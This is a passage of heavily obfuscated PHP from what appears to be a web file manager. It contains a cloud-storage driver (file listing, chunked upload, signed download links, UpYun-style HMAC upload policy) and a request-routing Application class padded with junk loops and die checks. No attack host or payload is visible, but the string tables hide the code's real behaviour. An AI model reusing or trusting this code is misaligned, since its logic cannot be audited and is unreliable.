($²Á©Ç­– as $ş‘ñŒİ) { $‘ê›Æ£‚ = $ş‘ñŒİ[$÷»ñ„¯Ş[33]] == $÷»ñ„¯Ş[75] ? !0 : !1; $Âíß¬Š‡ = ltrim($ŠÀ¨“ıÓ . $ş‘ñŒİ[$÷»ñ„¯Ş[32]], $÷»ñ„¯Ş[8]) . ($‘ê›Æ£‚ ? $÷»ñ„¯Ş[8] : $÷»ñ„¯Ş[12]); $Ú©­ÌÀî = array($÷»ñ„¯Ş[32] => $Âíß¬Š‡, $÷»ñ„¯Ş[33] => $‘ê›Æ£‚ ? $÷»ñ„¯Ş[75] : $÷»ñ„¯Ş[200], $÷»ñ„¯Ş[76] => $ş‘ñŒİ[$÷»ñ„¯Ş[337]], $÷»ñ„¯Ş[1492] => $ş‘ñŒİ[$÷»ñ„¯Ş[1498]]); $this->cacheMethodInfoSet($Âíß¬Š‡, $‘ê›Æ£‚, $Ú©­ÌÀî); if ($‘ê›Æ£‚) { $‰Ïë¸–[] = $Âíß¬Š‡; if ($†€ò¸úê) { $this->fileList($Âíß¬Š‡, $‰Ïë¸–, $¤Œö²ç£, $†€ò¸úê); } continue; } $¤Œö²ç£[] = $Ú©­ÌÀî; } if (count($²Á©Ç­–) < $ùé½ëğ–) { break; } } $this->cacheMethodInfoSet($–ŸæÅÒÎ, !0); } public function listPath($ıÖ­˜¥, $ÎÕÆæ¶ğ = false) { $“ÊÕƒòô =& $_SERVER[şÒÁøÒÄ]; $Œñ ƒƒ¾ = $½¸½»Œ = array(); $this->fileList($ıÖ­˜¥, $Œñ ƒƒ¾, $½¸½»Œ); foreach ($Œñ ƒƒ¾ as $½ù“—ÑÉ => $µ®Ï­À¯) { $Œñ ƒƒ¾[$½ù“—ÑÉ] = $this->folderInfo($µ®Ï­À¯, $ÎÕÆæ¶ğ); } foreach ($½¸½»Œ as $½ù“—ÑÉ => $µ®Ï­À¯) { $½¸½»Œ[$½ù“—ÑÉ] = $this->fileInfo($µ®Ï­À¯[$“ÊÕƒòô[32]], $ÎÕÆæ¶ğ, $µ®Ï­À¯); } return array($“ÊÕƒòô[82] => $Œñ ƒƒ¾, $“ÊÕƒòô[83] => $½¸½»Œ); } public function has($í§’Áàô, $Ï„Ñ‚˜Ó = false, $¨â·šß = true) { $Œ·í˜¿³ =& $_SERVER[şÒÁøÒÄ]; $™ÁëŠå² = $Œ·í˜¿³[12]; $¦åÔÌ“ó = 500; $‘–ËÛû = 0; $äøÕ¤ºÆ = 0; $æÍæàğ = rtrim($í§’Áàô, $Œ·í˜¿³[8]) . $Œ·í˜¿³[8]; while (!0) { check_abort(); $á–¤äš = $this->listObjs($í§’Áàô, $™ÁëŠå², $¦åÔÌ“ó); if (!$á–¤äš) { return !1; } $™ÁëŠå² = isset($á–¤äš[$Œ·í˜¿³[1496]]) ? $á–¤äš[$Œ·í˜¿³[1496]] : $Œ·í˜¿³[12]; $İ®Ò±óâ = isset($á–¤äš[$Œ·í˜¿³[1497]]) ? $á–¤äš[$Œ·í˜¿³[1497]] : array(); if (empty($İ®Ò±óâ)) { break; } $°Í’¾³’ = array_filter($İ®Ò±óâ, function ($µÇğÁ) { $Û¥ÓÖ’Ì =& $_SERVER[şÒÁøÒÄ]; return $µÇğÁ[$Û¥ÓÖ’Ì[33]] == $Û¥ÓÖ’Ì[75]; }); $«øøÀç = count($İ®Ò±óâ); $°Í’¾³’ = count($°Í’¾³’); $Œ¬ŒŞ­¢ = $«øøÀç - $°Í’¾³’; if ($Ï„Ñ‚˜Ó) { $äøÕ¤ºÆ += $°Í’¾³’; $‘–ËÛû += $Œ¬ŒŞ­¢; if ($«øøÀç < $¦åÔÌ“ó) { break; } continue; } if ($¨â·šß) { if ($Œ¬ŒŞ­¢) { return !0; } } else { if ($°Í’¾³’) { return !0; } } if ($«øøÀç < $¦åÔÌ“ó) { break; } } if ($Ï„Ñ‚˜Ó) { return array($Œ·í˜¿³[207] => $‘–ËÛû, $Œ·í˜¿³[208] => $äøÕ¤ºÆ); } return !1; } public function listAll($¶˜×‡ï‹) { $üŸ®³«ş =& $_SERVER[şÒÁøÒÄ]; $™€§íæõ = $ä˜¨ì = array(); $this->fileList($¶˜×‡ï‹, $™€§íæõ, $ä˜¨ì, !0); $„Ç·‹ôí = array_to_keyvalue($ä˜¨ì, $üŸ®³«ş[32]); foreach ($™€§íæõ as $¼¼£Ø¤Á) { if (is_string($¼¼£Ø¤Á)) { $„Ç·‹ôí[$¼¼£Ø¤Á] = array($üŸ®³«ş[76] => 0); } } return $this->listAllFiles($¶˜×‡ï‹, $„Ç·‹ôí); } public function canRead($‘Ÿ˜ÁÉã) { return $this->exist($‘Ÿ˜ÁÉã) ? !0 : !1; } public function canWrite($¬õœ©ıŞ) { return $this->exist($¬õœ©ıŞ) ? !0 : !1; } public function getContent($¾óµôÂğ) { return $this->fileSubstr($¾óµôÂğ, 0, -1); } public function setContent($ã¡¹–ÑÌ, $Ñ—ÍÊë† = '') { $ĞŒé÷„Œ =& $_SERVER[şÒÁøÒÄ]; if (!$Ñ—ÍÊë†) { $™šô¼‘Ú = $this->ussRequest($ã¡¹–ÑÌ, $ĞŒé÷„Œ[226]); return $™šô¼‘Ú[$ĞŒé÷„Œ[1225]]; } $½¸¢Æä× = $this->tempFile($this->pathThis($ã¡¹–ÑÌ)); file_put_contents($½¸¢Æä×, $Ñ—ÍÊë†); if ($this->upload($ã¡¹–ÑÌ, $½¸¢Æä×)) { $this->tempFileRemve($½¸¢Æä×); return !0; } return !1; } public function fileSubstr($”» ­›ã, $…Â¡šùä, $´ß²Í¤) { $ø¦¥äÂ =& $_SERVER[şÒÁøÒÄ]; if (!($´²¶ˆàÃ = $this->link($”» ­›ã))) { return !1; } $İèøîÀ° = !1; if ($´ß²Í¤ > 0) { $ÉªËø…² = $…Â¡šùä + $´ß²Í¤ - 1; $İèøîÀ° = array($ø¦¥äÂ[1459] . $…Â¡šùä . $ø¦¥äÂ[386] . $ÉªËø…²); } $Õ“¶Ş– = url_request($´²¶ˆàÃ, $ø¦¥äÂ[230], !1, $İèøîÀ°); return $Õ“¶Ş–[$ø¦¥äÂ[757]] ? $Õ“¶Ş–[$ø¦¥äÂ[1215]] : !1; } public function upload($€÷Ø¹è‰, $‚Äì—ı, $¾ìßŞõë = false, $º­Ó‘€„ = REPEAT_REPLACE) { $˜Òõ÷ =& $_SERVER[şÒÁøÒÄ]; $èçİÔ•Ÿ = IO::size($‚Äì—ı); if ($èçİÔ•Ÿ <= 1024 * 1024 * 200) { $ñ®ÃÀú = array($˜Òõ÷[1499] . $‚Äì—ı); $¾°ÓëÁ = $this->ussRequest($€÷Ø¹è‰, $˜Òõ÷[228], $ñ®ÃÀú); return $¾°ÓëÁ[$˜Òõ÷[1225]] ? $this->getPathOuter($€÷Ø¹è‰) : !1; } $Î¡ÚÓ‰¾ = 1024 * 1024 * 10; $Ş²ş­ = array($˜Òõ÷[1500], $˜Òõ÷[1501] . $èçİÔ•Ÿ, $˜Òõ÷[1502], $˜Òõ÷[1503] . $Î¡ÚÓ‰¾); $¾°ÓëÁ = $this->ussRequest($€÷Ø¹è‰, $˜Òõ÷[228], !1, $Ş²ş­); if (!$¾°ÓëÁ[$˜Òõ÷[1225]]) { return !1; } $¸Ğ«Ò³Ğ = $¾°ÓëÁ[$˜Òõ÷[1215]]; $§‡ÂÌÜ = 0; $¬´…ÛÇñ = $¸Ğ«Ò³Ğ[$˜Òõ÷[1504]]; $æ”Ÿ¡¢Ç = fopen($‚Äì—ı, $˜Òõ÷[1408]); if (!$æ”Ÿ¡¢Ç) { return !1; } do { $Úüèî¦° = $¸Ğ«Ò³Ğ[$˜Òõ÷[1505]]; fseek_64($æ”Ÿ¡¢Ç, $§‡ÂÌÜ); $€Á“æÑš = fread($æ”Ÿ¡¢Ç, $Úüèî¦°); $Îş†ÄŒâ = 0; do { $Îş†ÄŒâ++; $¸Ğ«Ò³Ğ = $this->uploadPart($€÷Ø¹è‰, $¸Ğ«Ò³Ğ, $€Á“æÑš); } while (!$¸Ğ«Ò³Ğ && $Îş†ÄŒâ < 3); if (!$¸Ğ«Ò³Ğ) { return !1; } $¬´…ÛÇñ = $¸Ğ«Ò³Ğ[$˜Òõ÷[1504]]; $§‡ÂÌÜ += $Úüèî¦°; } while ($¬´…ÛÇñ != -1); fclose($æ”Ÿ¡¢Ç); $Ş²ş­ = array($˜Òõ÷[1506], $˜Òõ÷[1507] . $¸Ğ«Ò³Ğ[$˜Òõ÷[1508]], $˜Òõ÷[1502]); $¾°ÓëÁ = $this->ussRequest($€÷Ø¹è‰, $˜Òõ÷[228], !1, $Ş²ş­); return $¾°ÓëÁ[$˜Òõ÷[1225]] ? $this->getPathOuter($º÷¤Ù‚Í) : !1; } private function uploadPart($·Êå¹Ø‰, $²ªš¼Ù», &$ëö¬§²å) { $ß¯±Ï‹ò =& $_SERVER[şÒÁøÒÄ]; $©§£ÀŠ = array($ß¯±Ï‹ò[1509], $ß¯±Ï‹ò[1507] . $²ªš¼Ù»[$ß¯±Ï‹ò[1508]], $ß¯±Ï‹ò[1510] . $²ªš¼Ù»[$ß¯±Ï‹ò[1504]], $ß¯±Ï‹ò[142] . $²ªš¼Ù»[$ß¯±Ï‹ò[1505]]); $‡ôÍƒ¬´ = $this->ussRequest($·Êå¹Ø‰, $ß¯±Ï‹ò[228], $ëö¬§²å, $©§£ÀŠ); return !$‡ôÍƒ¬´[$ß¯±Ï‹ò[1225]] ? $‡ôÍƒ¬´[$ß¯±Ï‹ò[1225]] : $‡ôÍƒ¬´[$ß¯±Ï‹ò[1215]]; } public function uploadFormData($“Äõ¹, $½ùõ©ÈÎ = 3600) { return $this->uploadPolicy($“Äõ¹, $½ùõ©ÈÎ); } public function multiUploadFormData($á’ñœ, $üÎŞü½Å = 3600) { $™ ±‡«¬ =& $_SERVER[şÒÁøÒÄ]; $ûìˆ¥Ÿ× = (int) $GLOBALS[$™ ±‡«¬[7]][$™ ±‡«¬[76]]; return $this->uploadPolicy($á’ñœ, $üÎŞü½Å, $ûìˆ¥Ÿ×); } private function uploadPolicy($Ì’éÇ¿ı, $Á÷Ï÷ = 3600, $ÖŞ½Úæí = 0) { $õíô³Ôë =& $_SERVER[şÒÁøÒÄ]; $¥Úåö£§ = $õíô³Ôë[8] . $this->bucket; $ æ–ûÊ¶ = gmdate($õíô³Ôë[1444]); $“Øß…ç® = array($õíô³Ôë[1511] => $this->bucket, $õíô³Ôë[1512] => $Ì’éÇ¿ı, $õíô³Ôë[1513] => time() + $Á÷Ï÷, $õíô³Ôë[1514] => $ æ–ûÊ¶); if ($ÖŞ½Úæí) { $“Øß…ç®[$õíô³Ôë[1424]] = $ÖŞ½Úæí; } $şÄúÊÓ = base64_encode(json_encode($“Øß…ç®)); $€´©şÙ… = base64_encode(hash_hmac($õíô³Ôë[1481], "\120\117\123\x54\46{$¥Úåö£§}\46{$ æ–ûÊ¶}\46{$şÄúÊÓ}", md5("{$this->userpass}"), !0)); $Ôî¡¦Ï— = array($õíô³Ôë[1347] => $şÄúÊÓ, $õíô³Ôë[1515] => "\125\120\x59\125\116\40{$this->username}\72{$€´©şÙ…}", $õíô³Ôë[182] => $this->endpoint . $¥Úåö£§); return $Ôî¡¦Ï—; } public function download($è±Ÿâá”, $ Ñş‘Ô÷) { $›€Êš•Ñ = IO::getPathInner(IO::mkfile($ Ñş‘Ô÷)); if (!($İ×Ğñ¤ı = $this->link($è±Ÿâá”))) { return !1; } $»õËáŒ = 0; $—Šã›•˜ = 1024 * 200; $†ÓÚå¹Œ = fopen($›€Êš•Ñ, $_SERVER[şÒÁøÒÄ][1465]); while (!0) { $·´â†Ğ‹ = $this->fileSubstr($è±Ÿâá”, $»õËáŒ, $—Šã›•˜); if ($·´â†Ğ‹ === !1) { return !1; } fwrite($†ÓÚå¹Œ, $·´â†Ğ‹); $»õËáŒ += $—Šã›•˜; if (strlen($·´â†Ğ‹) < $—Šã›•˜) { break; } } fclose($†ÓÚå¹Œ); return $ Ñş‘Ô÷; } public function link($ºÜã¯À¬, $¿ìšÓŸ = array()) { $ã¶ıÒø =& $_SERVER[şÒÁøÒÄ]; $ºÜã¯À¬ = trim($ºÜã¯À¬, $ã¶ıÒø[8]); if (!empty($this->token)) { $öú†•äš = strtotime(date($ã¶ıÒø[1516])); $ßô§ıÀş = substr(md5($this->token . $ã¶ıÒø[284] . $öú†•äš . $ã¶ıÒø[1517] . $ºÜã¯À¬), 12, 8) . $öú†•äš; $¿ìšÓŸ[] = $ã¶ıÒø[1518] . $ßô§ıÀş; } $´Á­ ¡À = !empty($¿ìšÓŸ) ? $ã¶ıÒø[73] . implode($ã¶ıÒø[284], $¿ìšÓŸ) : $ã¶ıÒø[12]; return $this->getHost() . $ã¶ıÒø[8] . $ºÜã¯À¬ . $´Á­ ¡À; } public function fileOut($ÑÃ¿ëŠ, $æ¾Â™Ğé = false, $†ª×ï‘í = false, $…©’Åı¬ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ÑÃ¿ëŠ, $æ¾Â™Ğé, $†ª×ï‘í, $…©’Åı¬); } if (!$†ª×ï‘í) { $†ª×ï‘í = $this->pathThis($ÑÃ¿ëŠ); } $‹ŠØÈÌ· = $æ¾Â™Ğé ? array($_SERVER[şÒÁøÒÄ][1519] . rawurlencode($†ª×ï‘í)) : array(); $àŒÑã“ï = $this->link($ÑÃ¿ëŠ, $‹ŠØÈÌ·); $this->fileOutLink($àŒÑã“ï); } public function fileOutServer($ÀïÎ¨Î, $äœŠŸ¬œ = false, $å½İ»´ = false, $˜·ê¯ = '') { parent::fileOut($ÀïÎ¨Î, $äœŠŸ¬œ, $å½İ»´, $˜·ê¯); } public function fileOutImage($¿¢ÄÕß, $Š›‚®Ÿè = 250) { $›òï¦„Ğ = $this->link($¿¢ÄÕß . $_SERVER[şÒÁøÒÄ][1520] . $Š›‚®Ÿè); $this->fileOutLink($›òï¦„Ğ); } public function fileOutImageServer($²Ñíü®¯, $·¤â€Ì = 250) { parent::fileOutImage($²Ñíü®¯, $·¤â€Ì); } public function hashMd5($‡–Œ·) { $­üÙ¯ñ =& $_SERVER[şÒÁøÒÄ]; $Æ°«¯é = $this->_objectMeta($‡–Œ·); return isset($Æ°«¯é[$­üÙ¯ñ[212]]) ? $Æ°«¯é[$­üÙ¯ñ[212]] : !1; } public function size($é§Ê‡şÍ) { $ãÖÂË¦ = $this->objectMeta($é§Ê‡şÍ); return $ãÖÂË¦ ? $ãÖÂË¦[$_SERVER[şÒÁøÒÄ][76]] : 0; } public function info($•²™âÓ) { if ($this->isFolder($•²™âÓ)) { return $this->folderInfo($•²™âÓ); } else { if ($this->isFile($•²™âÓ)) { return $this->fileInfo($•²™âÓ); } } return !1; } public function exist($Ãñ¼„ÂÀ) { return $this->isFile($Ãñ¼„ÂÀ) || $this->isFolder($Ãñ¼„ÂÀ); } public function isFile($‘…“–…ş) { return !$this->isFolder($‘…“–…ş) && $this->objectMeta($‘…“–…ş); } public function isFolder($—çòÜ) { return $this->cacheMethod($_SERVER[şÒÁøÒÄ][165], $—çòÜ); } protected function objectMeta($öÉöŞÈ–) { return $this->cacheMethod($_SERVER[şÒÁøÒÄ][167], $öÉöŞÈ–); } protected function _objectMeta($—¢—¦´) { $âÔÔ¼úŸ =& $_SERVER[şÒÁøÒÄ]; if ($—¢—¦´ == $âÔÔ¼úŸ[12] || $—¢—¦´ == $âÔÔ¼úŸ[8]) { return array(); } $×ÙÜµ« = $this->ussRequest($—¢—¦´, $âÔÔ¼úŸ[1521]); if (!$×ÙÜµ«[$âÔÔ¼úŸ[1225]]) { return null; } $ÂÈ¢üÌÁ = isset($×ÙÜµ«[$âÔÔ¼úŸ[1215]]) ? $×ÙÜµ«[$âÔÔ¼úŸ[1215]] : array(); if (!isset($ÂÈ¢üÌÁ[$âÔÔ¼úŸ[1522]])) { return null; } $½öóõìø = array($âÔÔ¼úŸ[33] => isset($ÂÈ¢üÌÁ[$âÔÔ¼úŸ[1522]]) ? $ÂÈ¢üÌÁ[$âÔÔ¼úŸ[1522]] : null, $âÔÔ¼úŸ[76] => isset($ÂÈ¢üÌÁ[$âÔÔ¼úŸ[1523]]) ? $ÂÈ¢üÌÁ[$âÔÔ¼úŸ[1523]] : null, $âÔÔ¼úŸ[212] => isset($ÂÈ¢üÌÁ[$âÔÔ¼úŸ[1524]]) ? $ÂÈ¢üÌÁ[$âÔÔ¼úŸ[1524]] : null, $âÔÔ¼úŸ[1491] => isset($ÂÈ¢üÌÁ[$âÔÔ¼úŸ[1525]]) ? $ÂÈ¢üÌÁ[$âÔÔ¼úŸ[1525]] : null); $½öóõìø[$âÔÔ¼úŸ[1492]] = isset($ÂÈ¢üÌÁ[$âÔÔ¼úŸ[1526]]) ? strtotime($ÂÈ¢üÌÁ[$âÔÔ¼úŸ[1526]]) : $½öóõìø[$âÔÔ¼úŸ[1491]]; return $½öóõìø; } protected function _isFolder($ÙµŸØÎÄ) { $­ÛñŒ¼ç =& $_SERVER[şÒÁøÒÄ]; if ($ÙµŸØÎÄ == $­ÛñŒ¼ç[12] || $ÙµŸØÎÄ == $­ÛñŒ¼ç[8]) { return !0; } $²‹Ö°º¼ = $this->_objectMeta($ÙµŸØÎÄ); return isset($²‹Ö°º¼[$­ÛñŒ¼ç[33]]) && $²‹Ö°º¼[$­ÛñŒ¼ç[33]] == $­ÛñŒ¼ç[75] ? !0 : !1; } } goto E¥÷Š„…ó»; Dœ®÷çÌ†¼: $gumtnpywzh = $_SERVER[şÒÁøÒÄ][609]; class Application { private $defaultModule = "\x69\x6e\x64\x65\170"; private $defaultController = "\x69\x6e\x64\145\x78"; private $defaultAction = "\151\x6e\x64\x65\x78"; function __construct() { } public function setDefault($ô™îØš) { $ÄşèĞıñ =& $_SERVER[şÒÁøÒÄ]; $­Âàº¿Ş =& $_SERVER[°ÖÎï]; $Õ ¸–¯© = explode($­Âàº¿Ş[0], trim($ô™îØš, $­Âàº¿Ş[0])); $ïöŒ¥²‡ = $ÄşèĞıñ[610]; $this->defaultModule = $Õ ¸–¯©[0] ? $Õ ¸–¯©[0] : $this->defaultModule; $¤›çõÛß = $ÄşèĞıñ[611]; if (strlen($¤›çõÛß) < $ÄşèĞıñ[612]) { die; } $this->defaultController = $Õ ¸–¯©[1] ? $Õ ¸–¯©[1] : $this->defaultController; $ïøí´ß„ = $ÄşèĞıñ[613]; if (strlen($ïøí´ß„) < $ÄşèĞıñ[614]) { die; } $this->defaultAction = $Õ ¸–¯©[2] ? $Õ ¸–¯©[2] : $this->defaultAction; $this->gxzke0a33d9d($­Âàº¿Ş[1], array($this, $­Âàº¿Ş[2])); $Å‹¯ş‘¤ = $ÄşèĞıñ[615]; while (strlen($Å‹¯ş‘¤) < $ÄşèĞıñ[616]) { if (!$Å‹¯ş‘¤) { break; } $Å‹¯ş‘¤++; } } public function appRun($ÉÒÌ²Ê) { $Ü’Ş’·Ó =& $_SERVER[şÒÁøÒÄ]; $Şò²Ò¾ =& $_SERVER[°ÖÎï]; $ïĞ”ö¹‘ = explode($Şò²Ò¾[0], $ÉÒÌ²Ê); $ßá…ü·‡ = $Ü’Ş’·Ó[617]; $éĞ“¹• = strtolower($ïĞ”ö¹‘[0]); $ıšèÛş† = $Ü’Ş’·Ó[618]; $Êï¶«Ê’ = $Şò²Ò¾[3]; $Û¼¿„ñõ = $Ü’Ş’·Ó[619]; if (strlen($Û¼¿„ñõ) < $Ü’Ş’·Ó[614]) { die; } if ($éĞ“¹• == $Şò²Ò¾[4]) { $Êï¶«Ê’ = $Şò²Ò¾[5]; $ïĞ”ö¹‘[0] = $Şò²Ò¾[6]; $ïĞ”ö¹‘[1] = $ïĞ”ö¹‘[1] . $Şò²Ò¾[7]; $ÉÒÌ²Ê = join($Şò²Ò¾[0], $ïĞ”ö¹‘); $ÉÒÌ²Ê = trim($ÉÒÌ²Ê, $Şò²Ò¾[0]); } call_user_func(array($Şò²Ò¾[8], $Şò²Ò¾[9]), $Êï¶«Ê’ . $Şò²Ò¾[10], $ÉÒÌ²Ê); ActionCall($ÉÒÌ²Ê); call_user_func(array($Şò²Ò¾[8], $Şò²Ò¾[9]), $Êï¶«Ê’ . $Şò²Ò¾[11], $ÉÒÌ²Ê); } private function autorun() { $òôÃÆĞ =& $_SERVER[şÒÁøÒÄ]; $íÒ§„©Š =& $_SERVER[°ÖÎï]; global $config; $±Ÿ çé¨ = $òôÃÆĞ[620]; while ($±Ÿ çé¨ < $òôÃÆĞ[616]) { if ($±Ÿ çé¨ >= 0) { break; } $±Ÿ çé¨++; } if (count($config[$íÒ§„©Š[12]]) == 0) { return; } foreach ($config[$íÒ§„©Š[12]] as $ŸñÛ œö => $¶«Œ›¯) { $this->appRun($¶«Œ›¯); $Èõ‚…˜ = $òôÃÆĞ[621]; } } private function hpxea4e5e2c5() { $¸Â”Œ¢û =& $_SERVER[şÒÁøÒÄ]; $ùú€ˆ± =& $_SERVER[°ÖÎï]; $£¶ŠÜÈù = $ùú€ˆ±[4]; $®ÖÌË…î = $GLOBALS[$ùú€ˆ±[13]][$ùú€ˆ±[14]][0]; if (!$®ÖÌË…î || strlen($®ÖÌË…î) <= strlen($£¶ŠÜÈù)) { return; } if (strtolower(substr($®ÖÌË…î, -strlen($£¶ŠÜÈù))) != $£¶ŠÜÈù) { return; } $Æ½ê´¹± = substr($®ÖÌË…î, 0, -strlen($£¶ŠÜÈù)); $Ùä¦Ë…÷ = array($ùú€ˆ±[4], $Æ½ê´¹±); $Àæİ¾±´ = $¸Â”Œ¢û[622]; $Øˆ³½ó = array_slice($GLOBALS[$ùú€ˆ±[13]][$ùú€ˆ±[14]], 1); $GLOBALS[$ùú€ˆ±[13]][$ùú€ˆ±[14]] = array_merge($Ùä¦Ë…÷, $Øˆ³½ó); $´ÉİÜ¡… = $¸Â”Œ¢û[623]; if (!$´ÉİÜ¡…) { return; } $GLOBALS[$ùú€ˆ±[13]][$ùú€ˆ±[15]] = implode($ùú€ˆ±[0], $GLOBALS[$ùú€ˆ±[13]][$ùú€ˆ±[14]]); } private function rowdbf8bc4b1() { $„îéÄÙä =& $_SERVER[şÒÁøÒÄ]; $ÂÀ®€ö =& $_SERVER[°ÖÎï]; if ($GLOBALS[$ÂÀ®€ö[13]][$ÂÀ®€ö[15]] != $ÂÀ®€ö[6]) { return; } $ıĞÍçíØ = $_SERVER[$ÂÀ®€ö[16]]; $¸Œ±ß›Ö = $ÂÀ®€ö[17]; $ÎÁü®ò½ = $„îéÄÙä[624]; if (!$ÎÁü®ò½) { return; } if (!strstr($ıĞÍçíØ, $¸Œ±ß›Ö)) { return; } $¥†Ä°¿ = strrpos($ıĞÍçíØ, $¸Œ±ß›Ö); $âì†µ§« = $„îéÄÙä[625]; if (!$âì†µ§«) { die; } $ô˜¤ºˆì = substr($ıĞÍçíØ, $¥†Ä°¿ + strlen($¸Œ±ß›Ö)); $ñ´øúØÃ = $„îéÄÙä[626]; if (strlen($ñ´øúØÃ) < $„îéÄÙä[627]) { die; } preg_match_all($ÂÀ®€ö[18], $ô˜¤ºˆì, $„ª»˜‡); $“¾Ğ…ıœ = $„îéÄÙä[628]; if (!$“¾Ğ…ıœ) { die; } $ô˜¤ºˆì = trim($„ª»˜‡[0][0], $ÂÀ®€ö[19]); $¦œ“¼×È = $„îéÄÙä[629]; $GLOBALS[$ÂÀ®€ö[13]][$ÂÀ®€ö[14]] = explode($ÂÀ®€ö[19], $ô˜¤ºˆì); $ŠÉğÕ‰ü = $„îéÄÙä[630]; $GLOBALS[$ÂÀ®€ö[13]][$ÂÀ®€ö[15]] = implode($ÂÀ®€ö[0], $GLOBALS[$ÂÀ®€ö[13]][$ÂÀ®€ö[14]]); $öìÏø¢ = $„îéÄÙä[631]; while ($öìÏø¢ < $„îéÄÙä[614]) { if ($öìÏø¢ >= 0) { break; } $öìÏø¢++; } } public function run() { $ªÀ¤¼¦ =& $_SERVER[şÒÁøÒÄ]; $Ä®™ñó— =& $_SERVER[°ÖÎï]; $this->rowdbf8bc4b1(); $this->hpxea4e5e2c5(); $ïïœ±ï = $ªÀ¤¼¦[632]; $ÙÚÉÏäÓ = $GLOBALS[$Ä®™ñó—[13]][$Ä®™ñó—[14]]; $„‹ ô = $ªÀ¤¼¦[633]; if (strlen($„‹ ô) < $ªÀ¤¼¦[612]) { die; } $·Åø…À† = $GLOBALS[$Ä®™ñó—[13]][$Ä®™ñó—[15]]; $ƒúÔÚ¹ù = $ªÀ¤¼¦[634]; while (strlen($ƒúÔÚ¹ù) < $ªÀ¤¼¦[614]) { if (!$ƒúÔÚ¹ù) { break; } $ƒúÔÚ¹ù++; } define($Ä®™ñó—[20], isset($ÙÚÉÏäÓ[0]) && $ÙÚÉÏäÓ[0] ? $ÙÚÉÏäÓ[0] : $this->defaultModule); $Œ³ëâÙ¹ = $ªÀ¤¼¦[635]; while ($Œ³ëâÙ¹ < $ªÀ¤¼¦[612]) { if ($Œ³ëâÙ¹ >= 0) { break; } $Œ³ëâÙ¹++; } define($Ä®™ñó—[21], isset($ÙÚÉÏäÓ[1]) && $ÙÚÉÏäÓ[0] ? $ÙÚÉÏäÓ[1] : $this->defaultController); $àˆùÈè› = $ªÀ¤¼¦[636]; if (!$àˆùÈè›) { return; } define($Ä®™ñó—[22], isset($ÙÚÉÏäÓ[2]) && $ÙÚÉÏäÓ[0] ? $ÙÚÉÏäÓ[2] : $this->defaultAction); $»®îµ£ = $ªÀ¤¼¦[637]; define($Ä®™ñó—[23], MOD . $Ä®™ñó—[0] . ST . $Ä®™ñó—[0] . ACT); $öäóñõ = $ªÀ¤¼¦[638]; $_SERVER[$Ä®™ñó—[24]] = strtolower(ACTION); $îş¤ŞÈ‹ = $ªÀ¤¼¦[639]; if (!$îş¤ŞÈ‹) { die; } $this->autorun(); $í·Çéø = $ªÀ¤¼¦[640]; if (strlen($í·Çéø) < $ªÀ¤¼¦[616]) { die; } if (count($ÙÚÉÏäÓ) >= 3) { $this->appRun($·Åø…À†); } else { $this->appRun(ACTION); } } private $grhme4a01004 = array(); private $zrjwb39d575c = ''; public function ykmx35179602() { $óµîäÙ· =& $_SERVER[şÒÁøÒÄ]; $¶–û²ºĞ =& $_SERVER[°ÖÎï]; $this->balr38389f95(); $this->juxv269b45a8(); $this->zeyfd6479cdb(); $this->alcx48d94461(); $this->eowudfaae44f(); $‚Í€–èÏ = $óµîäÙ·[641]; if (strlen($‚Í€–èÏ) < $óµîäÙ·[614]) { die; } $this->ipeuf120cc28(); $Øì±õ¯ = $óµîäÙ·[642]; if (!$Øì±õ¯) { return; } $this->xygf5bddd93e(); $ò™ê¬Ì‹ = $óµîäÙ·[643]; if (!$ò™ê¬Ì‹) { return; } $this->gxzke0a33d9d($¶–û²ºĞ[25], array($this, $¶–û²ºĞ[26])); $ú§İÁØ = $óµîäÙ·[644]; while (strlen($ú§İÁØ) < $óµîäÙ·[645]) { if (!$ú§İÁØ) { break; } $ú§İÁØ++; } $this->gxzke0a33d9d($¶–û²ºĞ[27], array($this, $¶–û²ºĞ[28])); $this->gxzke0a33d9d($¶–û²ºĞ[29], array($this, $¶–û²ºĞ[30])); $ÏÁõ€Œâ = $óµîäÙ·[646]; while ($ÏÁõ€Œâ < $óµîäÙ·[614]) { if ($ÏÁõ€Œâ >= 0) { break; } $ÏÁõ€Œâ++; } $this->gxzke0a33d9d($¶–û²ºĞ[31], array($this, $¶–û²ºĞ[32])); $ÚÕµ¸ğ = $óµîäÙ·[647]; } public function mvzs48dce574($»ëæÉ²ª) { $Ü»æ†æè =& $_SERVER[şÒÁøÒÄ]; $”ŞœÀİ¼ =& $_SERVER[°ÖÎï]; $”óø–ã = Model($”ŞœÀİ¼[33])->get(); $Ú¸å‡¹· = array($”ŞœÀİ¼[34], $”ŞœÀİ¼[35], $”ŞœÀİ¼[36], $”ŞœÀİ¼[37], $”ŞœÀİ¼[38], $”ŞœÀİ¼[39], $”ŞœÀİ¼[40], $”ŞœÀİ¼[41], $”ŞœÀİ¼[42], $”ŞœÀİ¼[43], $”ŞœÀİ¼[44], $”ŞœÀİ¼[45], $”ŞœÀİ¼[46], $”ŞœÀİ¼[47], $”ŞœÀİ¼[48], $”ŞœÀİ¼[49], $”ŞœÀİ¼[50], $”ŞœÀİ¼[51], $”ŞœÀİ¼[52], $”ŞœÀİ¼[53], $”ŞœÀİ¼[54], $”ŞœÀİ¼[55], $”ŞœÀİ¼[56], $”ŞœÀİ¼[57], $”ŞœÀİ¼[58], $”ŞœÀİ¼[59], $”ŞœÀİ¼[60], $”ŞœÀİ¼[61], $”ŞœÀİ¼[62], $”ŞœÀİ¼[63], $”ŞœÀİ¼[64], $”ŞœÀİ¼[65], $”ŞœÀİ¼[66], $”ŞœÀİ¼[67], $”ŞœÀİ¼[68], $”ŞœÀİ¼[69], $”ŞœÀİ¼[70], $”ŞœÀİ¼[71], $”ŞœÀİ¼[72], $”ŞœÀİ¼[73], $”ŞœÀİ¼[74], $”ŞœÀİ¼[75], $”ŞœÀİ¼[76], $”ŞœÀİ¼[77], $”ŞœÀİ¼[78], $”ŞœÀİ¼[79], $”ŞœÀİ¼[80], $”ŞœÀİ¼[81], $”ŞœÀİ¼[82], $”ŞœÀİ¼[83], $”ŞœÀİ¼[84]); $Î—ÀËäı = $Ü»æ†æè[648]; if (strlen($Î—ÀËäı) < $Ü»æ†æè[645]) { return; } foreach ($Ú¸å‡¹· as $Œßõûû…) { $ˆ£âÃ = $GLOBALS[$”ŞœÀİ¼[85]][$”ŞœÀİ¼[86]][$Œßõûû…]; if (isset($”óø–ã[$Œßõûû…])) { $ˆ£âÃ = $”óø–ã[$Œßõûû…]; } 